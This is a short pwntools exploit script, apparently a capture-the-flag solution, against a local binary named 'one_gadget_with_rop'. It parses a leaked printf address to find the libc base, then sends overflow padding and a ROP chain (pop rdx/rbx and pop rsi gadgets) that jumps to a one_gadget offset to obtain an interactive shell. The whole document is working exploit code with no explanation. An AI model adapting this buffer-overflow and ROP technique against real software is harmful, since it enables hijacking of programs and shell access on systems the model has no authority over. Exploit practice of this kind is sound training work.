from pwn import *
import sys

context.arch = 'amd64'

r = process('./one_gadget_with_rop')

r.recvuntil("Your libc: ")
printf_addr = r.recv(14)
print(printf_addr)
libc = int(printf_addr, 16) - 0x60770
info(f"libc: {hex(libc)}")

#gdb.attach(r)
raw_input()
pop_rdx_rbx_ret = libc + 0x90529
pop_rsi_ret = libc + 0x2be51

if len(sys.argv) > 1:
    r.send(b'a'*0x10 + p64(0x404000) + p64(pop_rdx_rbx_ret) + p64(0)*2 + p64(pop_rsi_ret) + p64(0) + p64(libc+0xebcf8))
else:
    r.send(b'a'*0x18 + p64(libc+0xebcf8))


r.interactive()
